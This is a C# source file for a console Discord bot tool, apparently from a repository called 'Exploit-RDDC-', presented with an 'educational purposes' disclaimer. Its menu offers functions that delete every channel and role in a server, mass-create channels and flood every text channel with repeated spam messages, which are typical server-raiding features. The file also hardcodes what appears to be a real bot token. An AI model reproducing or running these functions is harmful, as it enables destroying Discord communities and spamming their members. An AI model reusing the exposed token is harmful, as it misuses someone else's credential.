using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Discord.Net;
using Discord;
using Discord.WebSocket;
using System.Threading.Tasks;
using static System.Console;

    public class DiscordSupp
    {

        public static DiscordSocketClient bot;
        public static bool isConnected;
        public static async Task StartBotAsync()
        {
            bot = new DiscordSocketClient();
            bot.Log += Log;

            var token = "MTA5MDg1MzQ1MTA1Mjg5NjI3Ng.G83ZMX.PK2HcwRMByGeWNTSZDUeMKJlUf-JjsGM_Xll3k";

            await bot.LoginAsync(TokenType.Bot, token);
            await bot.StartAsync();

            Console.WriteLine("Bot encendido. Presione cualquier tecla para salir.");

            Console.ReadKey();


        }

        public static Task Log(LogMessage message)
        {
            Console.WriteLine(message.ToString());
            return Task.CompletedTask;
        }

        public static async Task SendMessageToChannel(ulong channelId, string message)
        {
            var channel = bot.GetChannel(channelId) as SocketTextChannel;
            if (channel == null)
            {
                Console.WriteLine($"No se pudo encontrar el canal con ID {channelId}.");
                return;
            }

            await channel.SendMessageAsync(message);
        }
        public static void Bot()
        {
            Clear();
            Program.InfoLog("This is the BotOptions section, with various options.\nWe are not responsible for what you do, all these options were created for educational purposes.\n\n");
            WriteLine();
            if (!isConnected)
            {
                StartBotAsync();
                isConnected = true;
            }
            Clear();
            WriteLine("[1] Send MSG to Channel");
            WriteLine("[2] Disable bot");
            WriteLine("[3] Reset Server");
            WriteLine("[4] Create Channels");
            WriteLine("[5] Spam MSG");
            WriteLine("[6] Template Server");
            WriteLine("[7] Home");
            int.TryParse(Console.ReadLine(), out int select);
            switch (select)
            {
                case 1:
                    Program.CMDLog("Enter the ChannelID parameter of type ulong");
                    ulong chanelID = ulong.Parse(Console.ReadLine());
                    Program.CMDLog ("Enter the Msg parameter of type string");
                    string msg = Console.ReadLine();
                    SendMessageToChannel(chanelID, msg);
                    ReadKey();
                    Bot();
                    break;
                case 2:
                    bot.StopAsync();
                    bot.LogoutAsync();
                    Bot();
                    isConnected = false;
                    break;
                case 3:
                    Program.CMDLog ("Enter the ServerID parameter of type ulong");
                    ulong svID = ulong.Parse(Console.ReadLine());
                    DiscordSupp.ResetServer(svID);
                    ReadKey();
                    Bot();
                    break;
                case 4:
                    Program.CMDLog ("Enter the ServerID parameter of type ulong");
                    ulong serverID = ulong.Parse(Console.ReadLine());
                    Program.CMDLog ("Enter the channelLoop parameter of type ulong");
                    int channelLoop = int.Parse(Console.ReadLine());
                    Program.CMDLog ("Enter the channelName parameter of type ulong");
                    string channelName = Console.ReadLine();
                    DiscordSupp.CreateChannels(serverID, channelLoop, channelName);
                    ReadKey();
                    Bot();
                    break;
                case 5:
                    Program.CMDLog ("Enter the ServerID parameter of type ulong");
                    ulong serverIxD = ulong.Parse(Console.ReadLine());
                    Program.CMDLog ("Enter the msgLoop parameter of type ulong");
                    int msgLoop = int.Parse(Console.ReadLine());
                    Program.CMDLog ("Enter the msgText parameter of type ulong");
                    string text = Console.ReadLine();
                    DiscordSupp.SpamMSG(serverIxD, msgLoop, text);
                    ReadKey();
                    Bot();
                    break;
                case 6:
                    Program.CMDLog ("Enter the ServerID parameter of type ulong");
                    ulong serverIDx = ulong.Parse(Console.ReadLine());
                    DiscordSupp.TemplateServer(serverIDx);
                    ReadKey();
                    Bot();
                    break;
                case 7:
                    Program.Main(new string[1]);
                    break;
            }
            ReadKey();
        }
        public static async Task ResetServer(ulong serverId)
        {
            var guild = bot.GetGuild(serverId);
            if (guild == null)
            {
                Program.ERRORLog($"no se pudo encontrar el servidor con ID {serverId}.");
                return;
            }

            foreach (var channel in guild.Channels)
            {
                channel.DeleteAsync();
            }
            foreach (var roles in guild.Roles)
            {
                roles.DeleteAsync();
            }

            Program.InfoLog($"Todos los canales del servidor {guild.Name} han sido borrados.");
        }
        public static async Task CreateChannels(ulong serverId, int channelCount, string channelName)
        {
            var guild = bot.GetGuild(serverId);
            if (guild == null)
            {
                Program.ERRORLog($"No se pudo encontrar el servidor con ID {serverId}.");
                return;
            }

            for (int i = 1; i <= channelCount; i++)
            {
                var channel = guild.CreateTextChannelAsync($"{channelName}");
                if (channel == null)
                {
                    Program.ERRORLog($"No se pudo crear el canal {channelName} {i}.");
                    continue;
                }
                Program.InfoLog($"Canal {channelName} creado en el servidor {guild.Name}. ({i}/{channelCount})");
            }
        }
        public static async Task SpamMSG(ulong serverId, int messageCount, string text)
        {
            var guild = bot.GetGuild(serverId);
            if (guild == null)
            {
                Program.ERRORLog($"no se pudo encontrar el servidor con ID {serverId}.");
                return;
            }

            foreach (var channel in guild.TextChannels)
            {
                for (int i = 0; i < messageCount; i++)
                {
                    channel.SendMessageAsync(text);
                }
            }

            Program.InfoLog($"Se han enviado {messageCount} mensajes a todos los canales del servidor {guild.Name}.");
        }
        
        public static async Task TemplateServer(ulong serverId)
        {
            var guild = bot.GetGuild(serverId);
            if (guild == null)
            {
                Program.ERRORLog($"No se pudo encontrar el servidor con ID {serverId}.");
                return;
            }
                Program.InfoLog($"[0/3]: Creando categorias de canales.");
                var cagText = await guild.CreateCategoryChannelAsync("Communication/Text");
                var cagVoice = await guild.CreateCategoryChannelAsync("Communication/Voice");
                Program.InfoLog($"[1/3]: Creando canales de texto.");
                var chatGeneral = await guild.CreateTextChannelAsync("„Äêüåé„Äëchat general", x => x.CategoryId = cagText.Id);
                await guild.CreateTextChannelAsync("„Äêüì∫„Äëmultimedia", x => x.CategoryId = cagText.Id);
                await guild.CreateTextChannelAsync("„Äêüîó„Äëlinks", x => x.CategoryId = cagText.Id);
                await guild.CreateTextChannelAsync("„Äêüìù„Äëcomandos", x => x.CategoryId = cagText.Id);
                await guild.CreateVoiceChannelAsync("„Äêüó£Ô∏è„Äëllamada grupal", x => x.CategoryId = cagVoice.Id);
                await guild.CreateVoiceChannelAsync("„Äêüéß„Äëmusica bot", x => x.CategoryId = cagVoice.Id);
                Program.InfoLog($"[2/3]: Creando roles.");
                var roleOwner = await guild.CreateRoleAsync("„Äêüëë„ÄëOwner", new GuildPermissions(administrator: true), Color.Green, true, false, RequestOptions.Default);
                var roleBot = await guild.CreateRoleAsync("„Äêü§ñ„ÄëBots", new GuildPermissions(administrator: true), Color.Green, true, false, RequestOptions.Default);
                var roleUser = await guild.CreateRoleAsync("„Äêüü¢„ÄëUsuario", new GuildPermissions(sendMessages: true), Color.Green, true, false, RequestOptions.Default);
                await guild.CreateRoleAsync("„Äêüî®„ÄëStaff", new GuildPermissions(manageRoles: true, manageChannels: true, muteMembers: true), Color.Green, true, false, RequestOptions.Default);
                Program.InfoLog($"[3/3]: Anadiendo roles");
                var members = guild.Users;
                foreach (var member in members)
                {
                    if (member.IsBot) { member.AddRoleAsync(roleBot); }
                    if (!member.IsBot) { member.AddRoleAsync(roleUser); }
                }
                string message = @"Thank you for using our bot.
                
                
                (Don't use it if you don't know how to use it, otherwise your server may be damaged, and we are not responsible)
                
                github repository: https://github.com/GokasGx/Exploit-RDDC- (this is public repository, only release)";
                Program.InfoLog($"Plantilla de servidor creada.");
                DiscordSupp.SendEmbed(chatGeneral.Id, "[‚úÖ] Finalized Template", message, Color.Green, "https://media.tenor.com/ocxJ2lhSSNsAAAAC/amongus-bailando.gif");

        }
        public static async Task SendEmbed(ulong channelId, string title, string description, Color color, string thumbnailUrl = null, string imageUrl = null, string footer = null, bool button = true, string link = "")
        {
            var channel = bot.GetChannel(channelId) as SocketTextChannel;
            if (channel == null)
            {
                Program.ERRORLog($"No se pudo encontrar el canal con ID {channelId}.");
                return;
            }
            var embedBuilder = new EmbedBuilder().WithTitle(title).WithDescription(description).WithColor(color);
    


            if (!string.IsNullOrWhiteSpace(thumbnailUrl))
            {
                embedBuilder.WithThumbnailUrl(thumbnailUrl);
            }
            
            if (!string.IsNullOrWhiteSpace(imageUrl))   
            {
                embedBuilder.WithImageUrl(imageUrl);
            }
            
            if (!string.IsNullOrWhiteSpace(footer))
            {
                embedBuilder.WithFooter(footer);
            }
            
            var embed = embedBuilder.Build();
            
            await channel.SendMessageAsync(embed: embed);
        }
    }
